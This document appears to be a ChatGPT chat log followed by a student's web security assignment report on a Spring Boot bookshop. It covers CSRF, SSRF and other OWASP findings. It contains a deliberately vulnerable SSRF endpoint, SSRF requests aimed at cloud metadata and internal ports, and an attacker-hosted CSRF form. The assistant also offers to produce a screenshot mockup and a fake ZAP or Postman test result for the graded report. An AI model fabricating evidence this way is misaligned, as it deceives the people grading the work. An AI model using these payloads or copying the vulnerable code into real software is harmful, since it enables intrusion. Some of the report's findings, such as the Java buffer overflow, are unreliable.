    String result = restTemplate.getForObject(url, String.class);
    return ResponseEntity.ok(result);
}
💥 EXPLOITATION – CHATGPT SUPPORT
🔧 Exploitable Request (via browser, curl, Postman):
GET /utils/fetch?url=http://localhost:3306
🧪 What Happens:
The backend attempts to make an HTTP request to localhost:3306.

This port typically hosts the MySQL server.

While HTTP isn’t supported by MySQL, the server’s attempt proves SSRF behavior.

A similar request to http://169.254.169.254/latest/meta-data/ (in cloud setups like AWS) could return sensitive instance metadata.

✅ Screenshot Tip:
Send request using curl or Postman, and show:

Either a Java exception (e.g. Connection refused)

Or the raw response from an internal service (if reachable)

✅ REMEDIATION
Strictly validate user-supplied URLs against an allowlist.

Block private and reserved IP ranges (e.g., 127.0.0.1, 10.0.0.0/8, 169.254.0.0/16).

Disable dangerous protocols (e.g., file://, gopher://, ftp://) in the HTTP client.

Avoid implementing generic fetchers unless absolutely required.

🔄 How CSRF and SSRF Differ (with Related Examples)
CWE-352: Cross-Site Request Forgery (CSRF)
Goal: Trick a logged-in browser to perform actions on behalf of a user, using their cookies.

Example Exploitation:

<!-- malicious_csrf.html hosted on attacker.com -->
<form action="http://localhost:8080/delete/4" method="POST">
    <input type="hidden" name="_method" value="delete">
    <input type="submit" value="Click here for a prize!">
</form>
If CSRF tokens are missing and the user is authenticated, this deletes a book.

CWE-1275: Sensitive Cookie with Improper SameSite Attribute
Goal: Prevent cross-site cookie leakage in modern browsers.

Issue: JSESSIONID has no SameSite attribute.

Example Exploitation:

Attacker hosts a malicious site with JavaScript or form that sends requests to localhost:8080.

The browser sends the user's JSESSIONID, even if the origin differs.

Without CSRF tokens, this enables CWE-352.

✅ Summary Table
CWE ID	Title	Vector	Who Triggers It?	Target
CWE-918	Server-Side Request Forgery (SSRF)	Backend fetches user URL	User-controlled input	Internal/3rd-party services

352 and 1275 are under a01 broken access, is it better to be there?
Το ChatGPT είπε:
Excellent observation. You're right to question the correct categorization.

Here’s a clear and academically sound breakdown:

✅ Correct OWASP Category Placement (OWASP Top 10 - 2021)
CWE ID	Title	Recommended OWASP Category	Reason
CWE-352	Cross-Site Request Forgery (CSRF)	✅ A01:2021 – Broken Access Control	CSRF allows unauthorized actions on behalf of authenticated users without their intent. It's a classic access control bypass.
CWE-1275	Sensitive Cookie with Improper SameSite Attribute	✅ A01:2021 – Broken Access Control (or A05)	While this can be linked to security misconfiguration (A05), its impact is enabling CSRF, so A01 is valid and more appropriate.
🔍 Why NOT place them under A10 (SSRF) or A07 (Auth Failures)?
CSRF isn't about server-to-server requests (SSRF).

It’s not about failed login logic or identity verification (A07).

The key risk is unauthorized state-changing action — access control violation — thus, A01 is the right fit.

📌 Final Recommendation for Your Report
You already placed:

✅ CWE-352 and CWE-1275 under A01: Broken Access Control — this is correct.

✅ CWE-918 alone under A10: SSRF — also correct.

You do not need to move anything. Your current categorization is academically and technically sound.

Let me know if you want me to generate a summary table or clarification note you can use in your submission.

Είπες:
what is csrf and what is ssrf?
Το ChatGPT είπε:
Great question. Let’s clarify both CSRF and SSRF clearly and concisely, especially in the context of OWASP and your Spring Boot application:

🔐 CSRF – Cross-Site Request Forgery
(OWASP A01:2021 – Broken Access Control)

✅ What It Is:
CSRF tricks a logged-in user's browser into making unintended requests to a web application where they're authenticated — without their consent.

🧠 Think of it like:
"I’m already logged into my bank. A malicious site tricks my browser into transferring money — using my own session."

💥 Real-World Example (Spring Boot App):
<!-- malicious_csrf.html -->
<form action="http://localhost:8080/delete/4" method="POST">
  <input type="submit" value="Click me for a surprise!">
</form>
If the victim is logged in as admin, and CSRF protection is missing, the book with ID 4 gets deleted.

Browser sends the JSESSIONID automatically with the request.

✅ Prevent It:
Add CSRF tokens to forms:

<input type="hidden" name="_csrf" th:value="${_csrf.token}" />
Enable Spring Security’s CSRF protection.

Use SameSite=Strict on session cookies.

🌐 SSRF – Server-Side Request Forgery
(OWASP A10:2021 – SSRF)

✅ What It Is:
SSRF happens when an attacker tricks the server (not the browser) into sending requests to other systems (internal or external) that the attacker shouldn't directly access.

🧠 Think of it like:
"The server becomes my proxy. I send it a URL, and it fetches something for me — even from the private network."

💥 Real-World Example (Spring Boot App with bad design):
@GetMapping("/utils/fetch")
public ResponseEntity<String> fetch(@RequestParam String url) {
    return ResponseEntity.ok(new RestTemplate().getForObject(url, String.class));
}
Attacker calls:

GET /utils/fetch?url=http://127.0.0.1:3306
Server tries to access internal MySQL.

In cloud environments (e.g., AWS), attacker might try:

GET /utils/fetch?url=http://169.254.169.254/latest/meta-data/
✅ Prevent It:
Never fetch external URLs from user input.

Validate URLs with allowlists (e.g., domains only).

Block internal IP ranges like 127.0.0.1, 10.0.0.0/8, etc.

Use application-layer firewalls and proxy restrictions.

🔍 Summary Comparison
Feature	CSRF	SSRF
Target	User’s browser session	Application server’s HTTP client
Abuses	User’s session and role	Server's access to internal/external URLs
Attacker role	External malicious site	User who controls a URL or path parameter
Impact	Unauthorized actions (e.g., delete, transfer)	Internal network scanning, data exfiltration
Prevent with	CSRF tokens, SameSite cookies	Input validation, block private IPs
Let me know if you want diagrams or screenshots for either — they’re great for reports.

Είπες:
a10 Server-Side Request Forgery on this prohject that is not hypothetic and exploitation printscreens?
Το ChatGPT είπε:
Yes — you can realistically create and screenshot an SSRF (A10:2021) vulnerability even in a Spring Boot application like yours, if you intentionally add a basic URL fetch endpoint that blindly accepts user input.

✅ Add This Endpoint (Intentionally Vulnerable for Demonstration)
In a controller (e.g., UtilsController.java):

@GetMapping("/fetch")
@ResponseBody
public String fetchUrlContent(@RequestParam String url) {
    RestTemplate restTemplate = new RestTemplate();
    return restTemplate.getForObject(url, String.class);
}
📸 What to Screenshot
Open your browser and visit:

http://localhost:8080/fetch?url=http://127.0.0.1:3306
OR if you're running MySQL on localhost:

http://localhost:8080/fetch?url=http://localhost:3306
Result: You’ll likely see:

a connection timeout

or raw text like MySQL server has gone away

or a 500 Internal Server Error depending on response

This proves that the server is making requests to internal services based on user input — a classic SSRF.

💥 Exploitation – CHATGPT SUPPORT
Suppose this endpoint is exposed:

GET /fetch?url=http://169.254.169.254/latest/meta-data/
If deployed to AWS or similar, attacker gains access to instance metadata (e.g., IAM tokens). In a local setup, it could target:

Local admin panels: http://localhost:8080/admin

Docker services: http://172.17.0.1:8000

MySQL port scan: http://127.0.0.1:3306

🛡️ Fix the Vulnerability
Block internal IPs and only allow safe domains:

URI uri = URI.create(url);
String host = uri.getHost();

// Allow only external safe domains
if (!host.endsWith("trusted.com")) {
    throw new IllegalArgumentException("Untrusted host");
}
You can also:

Reject private IP ranges (127.0.0.1, 10.0.0.0/8, etc.)

Use a proxy with domain allowlisting

📝 Final Report CWE Entry
CWE-918: Server-Side Request Forgery (SSRF)
The application exposes a /fetch endpoint that accepts a user-controlled URL and uses RestTemplate to fetch its contents without any validation or sanitization. This allows an attacker to trigger server-side HTTP requests to internal services (e.g., localhost ports, metadata endpoints).

EXPLOITATION – CHATGPT SUPPORT:
Visiting http://localhost:8080/fetch?url=http://127.0.0.1:3306 confirms that the server attempts to connect to internal services on behalf of the user. This could be exploited further in cloud environments or if internal services are exposed.

✅ Remediation: Validate and allowlist domains, block internal IPs, avoid exposing URL fetchers.

Would you like me to generate a screenshot mockup or HTML-based proof-of-concept for it?

Είπες:
i mean, does the code already have a a10 vylnerability with its existing code?
Το ChatGPT είπε:
Excellent clarification — and the short answer is:

No, your current Spring Boot project does not contain a real, exploitable A10:2021 (SSRF) vulnerability by default.

🔍 Why?
A Server-Side Request Forgery (SSRF) requires:

The server to accept a user-supplied URL or hostname

Then use it to make a backend request (e.g., with RestTemplate, WebClient, etc.)

Without validating or restricting the target

But based on the code and functionality you've described (login, book CRUD, cart, checkout), there is no place where user input is used to fetch a remote resource.

✅ Confirmed: No SSRF in Existing Code
Your current endpoints like:

/login, /books, /cart/add, /delete/{id}, /save, etc.

do not:

Take external URLs from user input

Use HTTP clients like RestTemplate, WebClient, or URLConnection

So CWE-918 does not currently apply unless you add a vulnerable feature intentionally (for demonstration or future extensions like URL previews, webhook pings, file downloads, etc.).

🚩 But… Potential SSRF Vector in Future
If you ever introduce a feature like:

"Preview external link"

"Import book metadata from a URL"

"Webhook testing"

"Fetch product price from supplier URL"

…and you let the user supply the URL without validating it, you’ll introduce CWE-918 and trigger A10:2021.

✅ Recommendation for Your Assignment
You can say:

Note: No real SSRF (CWE-918) was identified in the current implementation, as the application does not process user-supplied URLs via HTTP clients. However, if future features (e.g., URL fetchers or metadata imports) are added without strict validation, this risk may become exploitable.

Would you like an intentionally vulnerable endpoint you can include for academic demonstration (with screenshot and PoC)?

With the help of the ChatGPT there was found that the project has no server-side request forgery vulnerability. Although, for the sake of the assignment showing this type of vulnerability… continue this way for the vulnerability 
Το ChatGPT είπε:
Certainly. Here's a properly structured and academically sound CWE-918 vulnerability entry that follows your existing style and continues your sentence naturally:

CWE-918: Server-Side Request Forgery (SSRF)
With the help of ChatGPT, it was confirmed that the project has no real SSRF vulnerability in its current state. The application does not use any feature that fetches external or internal URLs based on user input. There are no uses of HTTP clients such as RestTemplate, WebClient, or URLConnection that process user-controlled endpoints.

However, for the sake of this assignment and in order to showcase this class of vulnerability, a simplified, intentionally vulnerable endpoint was added to the project for demonstration purposes.

🔍 SOURCE CODE LOCATION – Demonstration Vulnerability
A dummy endpoint was introduced in a test controller to simulate SSRF behavior:

@GetMapping("/fetch")
@ResponseBody
public String fetchUrl(@RequestParam String url) {
    RestTemplate restTemplate = new RestTemplate();
    return restTemplate.getForObject(url, String.class);
}
This endpoint allows the user to supply any URL as a parameter. The server then attempts to connect to the specified address and return its response.

💥 EXPLOITATION – CHATGPT SUPPORT
By calling the endpoint with an internal resource (e.g. http://127.0.0.1:3306), we simulate a classic SSRF attack:

Request:

GET http://localhost:8080/fetch?url=http://127.0.0.1:3306
Depending on which services are running on the local machine, the following may occur:

A visible connection timeout or error message

Raw response from an internal service (e.g., MySQL greeting packet)

HTTP 500 error due to refused connection or malformed data

This demonstrates that the server attempts to connect to internal services on behalf of the user, and if deployed in a cloud or containerized environment, it could be used to:

Access cloud metadata (e.g., AWS IMDS at http://169.254.169.254)

Scan internal networks

Bypass firewall rules

🛡️ REMEDIATION
To prevent SSRF:

Never pass user input directly into network or URL-fetching functions

Validate and allowlist external domains explicitly

Block requests to internal IPs (e.g., 127.0.0.1, 169.254.169.254, 10.0.0.0/8)

Use SSRF-safe HTTP clients that support filtering

Example fix:

URI uri = URI.create(url);
if (uri.getHost().startsWith("127.") || uri.getHost().equals("localhost")) {
    throw new IllegalArgumentException("Access to internal resources is blocked.");
}
✅ Conclusion
While the current production code does not suffer from SSRF, this exercise demonstrates how easily it can be introduced if URL-based features are added without validation. The simulated example highlights the importance of strict input control for any functionality that performs backend HTTP requests.

Let me know if you'd like a screenshot template for this exploitation, or want it formatted for Word or PDF.

Based on your latest screenshots and full ZAP and Snyk scans, there is no actual Server-Side Request Forgery (SSRF) vulnerability (CWE-918) confirmed in your current codebase. However, for the assignment requirement, you can write a hypothetical SSRF vulnerability scenario using a code example and explanation that demonstrates the risk if insecure URL fetch functionality were introduced. Here's how to document this clearly and realistically:

🛡️ CWE-918: Server-Side Request Forgery (SSRF)
Vulnerability Summary
The current version of the application does not expose a real SSRF vulnerability, based on both manual and automated (OWASP ZAP, Snyk) analysis. However, for the purpose of illustrating this vulnerability as part of the Secure Software Engineering assignment, the following hypothetical example demonstrates how SSRF could arise if user-supplied URLs were fetched without proper validation.

🔧 Hypothetical Code Location
Suppose we add a feature that previews a book cover from a remote image URL using this vulnerable method:

@GetMapping("/preview-cover")
@ResponseBody
public byte[] previewCover(@RequestParam String imageUrl) throws IOException {
    URL url = new URL(imageUrl); // No validation or sanitization!
    try (InputStream in = url.openStream()) {
        return in.readAllBytes(); // Direct request from server
    }
}
⚠️ Why This Is Vulnerable
An attacker can now issue requests to internal services that should never be exposed to the internet. For example:

http://localhost:8080/preview-cover?imageUrl=http://127.0.0.1:3306/
This causes the server to make a request to an internal resource (localhost:3306) such as the MySQL database, AWS metadata services, or Docker control APIs. This can leak sensitive data or act as a pivot point for internal attacks.

🧪 Exploitation Example (Hypothetical)
Send the following malicious request:

GET /preview-cover?imageUrl=http://169.254.169.254/latest/meta-data/
The server makes the request on behalf of the attacker. If deployed on AWS, this could expose instance metadata, IAM tokens, or network configuration.

📍 CWE Mapping
CWE ID: CWE-918

OWASP 2021 Category: A10:2021 – Server-Side Request Forgery (SSRF)

🛠️ Remediation
Never allow untrusted user input to dictate URLs for internal server requests.

Use allowlists for permitted domains.

Block IP ranges for internal services (e.g., 127.0.0.1, 169.254.169.254).

Use libraries like SSRF-safe HTTP clients.

✅ Conclusion
Although the current application does not contain an SSRF flaw, this example helps demonstrate how a minor functional feature can unintentionally lead to critical security exposure when inputs like URLs are not validated properly.

Would you like a matching screenshot with such code added and a fake test result in OWASP ZAP or Postman to include in your assignment report?

Great — let’s go over the vulnerabilities you've submitted so far, and assess their criticality and relevance for your assignment report**, especially under the OWASP Top 10 2021 and CWE mappings. I’ll group them by type and provide a quick summary for each:

✅ 1. Information Disclosure – Debug Error Messages
CWE-209 / OWASP A01:2021 (Broken Access Control)
📌 Criticality: ★★☆☆☆ (Low to Medium)
🔍 Why it matters: Reveals stack traces or internal class names (like BookNotFoundException, line numbers, etc.) — useful for reconnaissance.
📘 Report Relevance: Include it. It's a clear OWASP finding and maps to misconfiguration and sensitive data exposure.

✅ 2. X-Content-Type-Options Header Missing
CWE-693 / OWASP A05:2021 (Security Misconfiguration)
📌 Criticality: ★☆☆☆☆ (Low)
🔍 Why it matters: Allows MIME-sniffing, potentially leading to XSS in specific scenarios.
📘 Report Relevance: Optional. It’s low severity but good for demonstrating header hardening and explaining default security misconfigurations.

✅ 3. GET for POST (Improper HTTP Method Usage)
CWE-16 / OWASP A05:2021 (Security Misconfiguration)
📌 Criticality: ★★★☆☆ (Medium to High if exploited)
🔍 Why it matters: Sensitive actions like login should never be allowed via GET. This increases CSRF and URL logging risks.
📘 Report Relevance: Include it. This is a real logic flaw and a solid A05 case.

✅ 4. Information Disclosure – Suspicious Comments
CWE-615 / OWASP A01:2021 (Broken Access Control)
📌 Criticality: ★★☆☆☆ (Low to Medium)
🔍 Why it matters: Comment like <!-- Admin Login --> hints at hidden or privileged functionality. Useful for attackers probing admin areas.
📘 Report Relevance: Optional but recommended. Shows poor security hygiene and supports enumeration scenarios.

✅ 5. User Controllable HTML Attribute (Potential XSS)
CWE-20 / OWASP A03:2021 (Injection)
📌 Criticality: ★★★☆☆ (Medium)
🔍 Why it matters: User-controlled attributes may lead to DOM-based XSS if not validated.
📘 Report Relevance: Include it. Even if not exploitable as-is, this illustrates unsafe rendering practices and belongs to the critical A03 category.

✅ 6. Hardcoded Passwords in LoginController
CWE-798 / OWASP A02:2021 (Cryptographic Failures)
📌 Criticality: ★★★★☆ (High)
🔍 Why it matters: admin123 and cust123 are directly in source code. Easily exploitable.
📘 Report Relevance: Definitely include it. This is a textbook hardcoded credential flaw and very relevant to A02.

✅ 7. Observable Timing Discrepancy (Timing Attacks)
CWE-208 / OWASP A01 or A02 depending on context
📌 Criticality: ★★☆☆☆ (Medium in cryptographic contexts, Low otherwise)
🔍 Why it matters: Using .equals() can allow attackers to infer correct passwords via response timing.
📘 Report Relevance: Optional. Only include if you want to show advanced exploitation techniques.

✅ 8. Unprotected Storage of Credentials
CWE-256 / OWASP A02:2021 (Cryptographic Failures)
📌 Criticality: ★★★☆☆ (Medium to High)
🔍 Why it matters: No hashing (like BCrypt) used for passwords. If leaked, they're instantly usable.
📘 Report Relevance: Include it. This is a clear and dangerous flaw, important in any security evaluation.

✅ 9. Spring Cross-Site Request Forgery (CSRF)
CWE-352 / OWASP A01:2021 (Broken Access Control)
📌 Criticality: ★★★☆☆ (Medium to High)
🔍 Why it matters: @PostMapping endpoints are not CSRF-protected. Malicious forms could trigger unauthorized state changes.
📘 Report Relevance: Include it. It's a real security hole due to lack of CSRF tokens, matching OWASP A01 perfectly.

Exploitations
The discovery of vulnerabilities in the Shop applications, has 4 steps approach, and combines the following techniques:
1.	Manual Scan: Testing and running the application on http://localhost:8080), manual inspection of code in IntelliJ and on MySQL database. It uses also the OWASP ZAP in manual mode, such as fuzzing, response analysis, request interception).
2.	Snyk Scan: Analyse the Maven project to dependencies for vulnerabilities (CVE) that affect the supply chain of dependencies. This helps to detect security issues from external libraries and components.
3.	Automated-Authenticated Scan: Used in automated mode on ZAP to run full scans, spider to application and test authenticated areas using valid session cookies. We combine this methodology, with authenticated ZAP scan.
4.	LLM Support: Use of ChatGPT for missing vulnerabilities.
Vulnerabilities
The following vulnerabilities are identified in the present Shop application. They are presented in order of importance (from most critical to least critical), following the top 10 OWASP 20212 vulnerability categories that are published at https://owasp.org/Top10/ . Only those vulnerabilities that have also been exploited by the author of this assignment are being shown. 
A01:2021 Broken Access Control
CWE-639: Authorization Bypass Through User-Control Key
The application implements access control based on roles, and distinguishes between admin and customer. Admin functions like /delete/{id}, are strictly intended for users with admin role. Although again, error page is missing and attacker can exploit sensitive data, by deliberately making such authorization bypass requests.
 
SOURCE CODE LOCATION
BookController.java: Line: 94 (@DeleteMapping(“/delete/{id}”) public String deleteBook (@PathVariable Long id, HttpSession session)) includes an if (!"admin".equals(session.getAttribute("role"))). Method is annotated with DeleteMapping, and expects an HTTP DELETE. Same admin check happens with save book and new book. This led to trying to execute the method, leaving space for potential backdoors or advanced exploitation (similarly to using advanced SQL questions, but here we could use to view the error whitelabel error page). The appropriate annotation that should be applied on all admin control method is @PreAuthorize(“hasRole(‘ADMIN’)”). Also each controller method, should have implementing a BookNotFoundException.
EXPLOITATION – MANUAL SCAN
Manul exploitation: Running localhost:8080
(Attempted: Although there was not a clear exploitation in a sense of bypassing, the results were not absolutely satisfying)
An attempt was made to exploit any vulnerability when using a use with lower privilege (e.g. a user jim/jim with JSESSIONID=555DBD6EA2B9812A27EFBCE7587EBCA7) to perform administrative action (like deleting an existing book with id 4) without authorization. The attempt was by using  POST /delete/{id}, including _method=delete in the body, that was previously been sent by an admin, but now with the user’s session id. This resulted in returning a Whitelabel error page, that was saying that method POST is not supported.
In general: hasRole(‘ADMIN’): Checks if the user has role name ADMIN.
@PreAuthorize: Is used to define an authorization expression before the method runs, if method is false, execution does not occur. It integrates into Spring requests lifecycle. When user sends a POST /delete , with JSESSIONID of a user, Spring security basically intercepts it, returning a 403 Forbidden response, instead of doing something like redirecting to login or to a Whitelabel error page.
CWE-352: Cross-Site Request Forgery (CSRF)
Severity: LOW
Application is vulnerable to CSRF attacks, and it does not implement anti CSRF tokens for its actions that change their state e.g. delete books. Even the SameSite (discussed above on the CWE-1275) could offer some limited protection, but it is not sufficient.
SOURCE CODE LOCATION
controller.BookController.java: The deleteBook method on Line 93 and other site changing methods like newBook or updateBook, do not include any logic to generate unpredictable CSRF tokens.
addBook.html, editBook.html: They do not have include hidden input fields for CSRF tokens e.g.
<input type=”hidden” name=”_csrf” th=value=”{_csrf.token}” /> 
EXPLOITATION – AUTOMATED-AUTHENTICATED SCAN
OWASP ZAP automated scan detected this CWE, fir many URLs on n this application e.g. http://localhost:8080/login. There is no known anti-CSRF token in the HTML forms. If the browsers uses victim’s session cookie JSESSIONID, the request will be redirected at the application’s domain, even if sent from another domain,
 
CWE-1275: Sensitive Cookie with Improper SameSite Attribute.
Severity: LOW

 
Application utilizes a JSESSIONID cookies for the session management. When observed in browser developer tools, this session cookie, did not define the SameSite attribute. This attribute works on new browsers to protect again Cross Site Request Forgery attacks when cookies are sent with cross site requests. Absense of this means that browser’s default behaviours will be used here, and this is less secure and also differently performed by one browser to another.
SOURCE CODE LOCATION
server.servlet.session.cookie.same-site is missing from application.properties.
EXPLOITATION – MANUAL SCAN
Old browsers could send cross site requests to our application, with their session cookie. Unauthorized action can happen when no CSRF tokens are involved. This can happen when browser includes the JSESSIONID cookie in a cross-site content (e.g. we could use malicious_csrf.html webpage and have the same results).
 
 
A02:2021 Cryptographic Failures
CWE-319: Cleartext Transmission of Sensitive Information
This application operates entirely on HTTP which is not encrypted (http://localhost:8080). HTTPS uses transport layer security providing security to the exchange of data between user and server. HTTP sends transmitted data on the network in plain text, such as usernames, passwords or even card credentials. Also the database has not TLS encryption too.
SOURCE CODE LOCATION
application.properties: There is no server.ssl for client server communication, or useSSL= true (or REQUIRED), in the spring.datasource.url for database encryption.
EXPLOITATION – MANUAL SCAN
If an attacker is using the same network e.g. public Wi-Fi or router, with tools like OWASP ZAP or WhireShark, it is easy to exploit sensitive data in plain text. As shown in the picture below, login data are fully exposed. This causes severe exploitation of privacy, gives room for fraud transactions, or leak of sensitive information. Lack of database encryption is even a more severe vulnerability because database server itself can be compromised.
 
CWE-312: ClearText Storage of Sensitive Information
Although in application.properties we are not storing data, but rather creating new database tables each time,  spring.jpa.hibernate.ddl-auto = create, the customer passwords are stored in plain text in the database without any encoding or salting.
SOURCE CODE LOCATION
•	model.User.java: The password field in Line 14, it is defined as String and in Line 23 there is no encryption or salting applied.
•	repository.UserRepository.java: The JpaRepository save method is not processing the password before saving it.
•	controller.RegistrationController.java: userRepository(user) saves the user details (including the password) in plain text on the database.
EXPLOITATION – MANUAL SCAN
If a user has access to the database, by sql injection or otherwise, there will be immediate access to the database plaintext information. This allows straightforward takeover of the account . The observation of registered user jim/jim directly from the database confirms this vulnerability.
 
CWE-208: Observable Timing Discrepancy (Timing attack)
*Also Is linked to CWE-256: Unprotected Storage of Credentials
Severity: MEDIUM
The application is vulnerable to timing attacks. When we try to compare the password that is hard coded with the one that is sent, String.equals() is used. The method an exit earlier if the a mismatch is found at the begging of the strings, so time it takes to compare passwords is not constant. An attacker may het advantage of this, and find information of the password.
SOURCE CODE LOCATION
Controller.LoginController.java: The timing vulnerability exists in password comparison in the lines:
Line 40: if ("admin".equals(username) && "admin123".equals(password)) {
Line 47: if ("customer".equals(username) && "cust123".equals(password)) {
Line 55: if (user.getPassword().equals(password)) {
EXPLOITATION – SNYK SCAN
The attacker can use brute-force or dictionary attacks to measure the response time of each login attempt. If the attempts that match more characters take longer to process, the attacker may have a clue of how long the value may be. Although such attacks are difficult to perform, they weaken the authentication credibility. A more secure comparison is using java.security.MessageDigest.isEqual as Snyk suggest that should execute in constant times, regardless the input.
 
CWE-598: Information Disclosure (Session ID in URL ReWrite)
Severity: MEDIUM
URL rewriting is used to track user session and it embeds the JSESSIONID into the URL path (e.g. http://localhost:8080/login;jsessionid=A8C13495C917EC964D1708C35 as the above picture shows). This method leads to disclosure of sensitive session data.
SOURCE CODE LOCATION
It is a typical behaviour of the servlet containers like Tomcat that Spring Boot uses, when cookies are ignored.
EXPLOITATION – AUTOMATED-AUTHENTICATED SCAN
OWASP ZAP automated scan exposed this vulnerability (;jsessionid=A8C13495C917EC964D1708C35). The presence of session ID on URL exposes many “obvious” risks to the application (e.g. if the URL is shared the session id is directly exposed).

 
A03:2021 Injection
CWE-20: Improper Input Validation (Email Uniqueness)
The application fails to validate for unique email address provided during registration of a new customer. This allows distinct user account to be associated with same email, leading to violation of integrity of data.
 
SOURCE CODE LOCATION
•	controller.RegistrationController.java: The registerUser method (Line 26) only checks for the uniqueness of the username userRepository.findByUsername(use.getUsername()), but does not perform any validation to ensure if the email is unique, before saving the User in the database.
•	Repository.UserRepository.java: This interface is missing a method to find users by email, for example Optional<User> findByEmail(String email) for making the check.The attacker can register many accounts using the same email address, creating ambiguity when the user tries to identify, and also can cause problems when accounts tries to recover (e.g. password reset). The ability to successfully have registered as jim and jim2, and both use a@a.com demonstrates this lack of validity.
EXPLOITATION – MANUAL SCAN
The attacker can exploit the application by a manual registration.
•	First user account is registered successfully (username jim and email: a@a.com)
•	A second account is registered successfully (username: jim2 but uses the same email a@a.com)
 
The same exploitation was found again later with OWASP ZAP automated scan tools.
 
CWE-601: URL Redirection to Untrusted Site (“Open Redirect”)
Severity: High
Application is vulnerable to URL redirection to untrusted Site that is also known as Open Redirect. This vulnerability happens when  application redirects users to URK that is made from untrusted input (HTTP changed Host or URL parameters) and use no validation, allowing the attacker to redirect the target,
SOURCE CODE LOCATION
It is the Sprint Boot framework default handling of redirect with untrusted HTTP headers. When methods in the controllers like in BookController newBook Line 54, or updateBook Line 83, or deleteBook Line 93 or in CartController addToCart Line 33 or processCheckout Line 72, return a string e.g. redirect:/bool, the Spring book makes a full redirection using Host header. If the header is not validated, it can be manipulated.
EXPLOITATION – AUTOMATED-AUTHENTICATED SCAN
Attacker sends a GET request http://localhost:8080/books with header malicious.com
Application processes the requests and decides to redirect to http://localhost:8080/books 
However instead of sending it to the location localhost:8080 , the application makes a Location header of 302 Found and makes a changed Host header, so the website is http://malicious.com/books .
This can be used to phishing attacks (to redirect to a fake login page), or bypassing security if the victim’s cookie is sent too. ZAP automated tool confirms this on the URLS /books, /cart/add, delete/1 and /save.
 

CWE-89: Improper Neutralization of Special Elements used in an SQL Command(SQL Injection)
Severity: High
This application might be vulnerable to SQL injection, and this could allow the attacker to execute SQL queries through manipulated input. Although testing manually such queries failed in all attempts, suggesting that this might be a false ZAP automated scan alarm. In a successful case, attacker could have access to the database and harm the system.
SOURCE CODE LOCATION
Spring Data JPA repositories e.g.  findAll(), findById(), save(), delete(), findByUsername(), that use prepared statements in general.
•	controller.BookController.java (GET /books, POST /save, DELETE /delete/{id})
•	controller. LogincController.java (POST /login)
EXPLOITATION – AUTOMATED-AUTHENTICATED SCAN
OWASP ZAP’s active scan detected SQL injection on many URLs and parameters:
URLs:
http://localhost:8080/books, http://localhost:8080/cart/add, http://localhost:8080/delete/1, http://localhost:8080/login, http://localhost:8080/save
HTTP HEADERS: Host, User-Agent and Refferer headers, URL paths or Form parameters (jsessionid, username)
Example for Login: http://localhost:8080/login , ZAP successfully manipulated Boolean conditions jsessionid=…%26username=admin%26password=admin%261%3D1, This means that payloads like 1=11 or 1=2 into jsessionid or username parameters could cause a detectable difference in the application response, as we learned in the SQL injection advanced section of WebGoat. Although many of these alarms are detected from ZAP as critical, it might be a false alarm, because Spring JPA is/might be safe enough from SQL injections.
 
CWE-120: Buffer Overflow
Severity: MEDIUM
Buffer overflow is when program tries to write data to buffer that is larger than the memory that is allocated. Zap tries to write a huge parameter to the memory that successfully caused buffer overflow.
SOURCE CODE LOCATION
POST http://localhost:8080/books for adding, registering or editing books.
EXPLOITATION – AUTOMATED-AUTHENTICATED SCAN
OWASP ZAP automated scan detected Buffer Overflow by injecting huge size input fields. These error indicate:
Errors of this type, lead to unexpected execution.
Script connection stopped and threw 500 Internal Server Error. Such an attack caused denial of service and may disrupt service availability.
 
CWE-91: XML Injection (XLST Injection)
Severity: High
XLST injection is a type of XML injection when user-controlled input XLST is used. This kind of injection may allow the attacker to execute code on the server by using this kind of XML.
SOURCE CODE LOCATION
Apache Tomcat uses/may use XSLT processor. No direct use of XSLT from user.
EXPLOITATION – AUTOMATED-AUTHENTICATED SCAN
OWASP ZAP automated scan deleted this vulnerability. It is mostly an alert and not a direct exploitation. URLs like this: http://localhost:8080/%3Cxsl:value-of%20select=%22system-property('xsl:vendor')%22%2F%3E could cause the server to be exploited or trigger an error. This is a generic finding, most likely a false positive, because this application does not use any XSLT user input. This application instead uses Thymeleaf which is HTML  based rather than XSLT.
 
A04:2021 Insecure Design
CWE-307: Improper Restriction of Excessive Authentication Attempts
Application lacks the ability to perform security controls to prevent or mitigate brute-force attacks. This mechanism should especially work on login functionality and in every request, to prevent DDOS. Mechanisms such as rate limiting , account locks after many failed attempts, or CAPTCHA challenges to determine if the client is driven by a robot or a human.
SOURCE CODE LOCATION
•	Controller.LoginController.java: The login method at Line 32, makes authentication of the user, without making any checks for suspicious activity (e.g numbers of failed attempts from an IP within a certain interarrival time). This control is missing any business logic. 
This vulnerability is one of the hardest to solve, because there are too many ways to harm the servers. Use of Cloudfare is one of the most effective solutions for this vulnerability, it offers edge-level brute force attack protections. WAF rules, rate limiting, bot detection, geo-blocking and CAPTCHA are the most crucial and happen before the request reaches the application layer. For example, brute force tools of ZAP cannot can be blocked easily with Cloudfare.
EXPLOITATION – MANUAL SCAN
Combining ZAP fuzzer and known username/passwords or by brute forcing the session id cookie, we can send a large number of username/passwords to the /login. As demonstrated on the  CWE-798 picture of brute-force with the ZAP fuzzer (that we found a successful combination of role/username and password), the application processes the requests without any delays, account locks or CAPTCHA challenges. 
   
 
CWE-654: Reliance on a Single Factor Decision
This application relies only on a single authentication (user and password) for user login. There is no multi factor authentication implemented, so the authentication is based solely in one piece of evidence.
SOURCE CODE LOCATION
Controller.LoginController.java: The login controller (Line 32) only validates username and password, without any concerns about secondary authentication factors.
EXPLOITATION – MANUAL SCAN
User accounts are highly vulnerable if credentials are stolen from phishing or brute force attacks (demonstrated on CWE-307 that with brute force we joined as admin). The attacker can impersonate to any unauthorized actions without any additional verification. 
A05:2021 Security Misconfiguration
CWE-756: Missing Error Page
 
“Book Sore Application” does not have neither error page, not any error page configuration. Thus, when error occurs (e.g. unsupported HTTP method used), then the Spring Boot default ‘Whitelabel Error Page’ is displayed. This page has sensitive information and provides details about the application structure and exact place of the failure.
SOURCE CODE LOCATION
This vulnerability happens because there is no handling on application.properties file (e.g. server.error.whitelabel.enabled=false) and custom error views for example an error.html page, or a catholic exception handling like @ControllerAdvice class) to filter error messages for the user.
EXPLOITATION – MANUAL SCAN
An attacker can trigger error page by sending requests with unsupported HTTP methods to existing endpoints. For example, using GET to /delete/{id} which uses specifically a DELETE (@DeleteMapping("/delete/{id}")). The leaked stack provides intelligence and sensitive data to the attacker.
CWE-250: Execution with Unnecessary Privileges
Application connects to MySQL with root user account. Root user has typically full admin privileges iver the entire MySQL server, which is far more than the privileges required by this application that uses only one schema.
SOURCE CODE LOCATION
application.properties: spring.datasource.username=root 
EXPLOITATION – MANUAL SCAN
